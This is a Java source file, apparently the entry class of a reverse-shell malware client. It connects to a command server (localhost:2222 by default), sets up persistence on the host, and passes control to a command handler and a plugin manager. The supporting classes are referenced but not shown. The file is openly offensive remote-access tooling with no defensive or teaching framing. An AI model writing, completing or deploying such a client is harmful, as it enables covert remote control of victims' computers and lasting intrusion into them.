package obs1d1anc1ph3r.reverseshell;

import java.io.IOException;
import java.util.logging.*;

public class ReverseShellClient {

    private static final Logger logger = Logger.getLogger(ReverseShellClient.class.getName());
    private final ServerConnection serverConnection;
    private final CommandHandler commandHandler;
    private final PluginManager pluginManager;

    public ReverseShellClient(String serverIp, int serverPort) {
        this.serverConnection = new ServerConnection(serverIp, serverPort);
        this.pluginManager = new PluginManager(serverConnection);
        this.commandHandler = new CommandHandler(serverConnection, pluginManager);
    }

    public void start() {
        try {
            serverConnection.connect();
            Persistence.setup();
            commandHandler.handleCommands();
        } catch (IOException e) {
            logger.log(Level.SEVERE, "Connection error: " + e.getMessage(), e);
        } finally {
            serverConnection.cleanup();
        }
    }

    public static void main(String[] args) {
        ReverseShellClient client = new ReverseShellClient("localhost", 2222);
        client.start();
    }
}
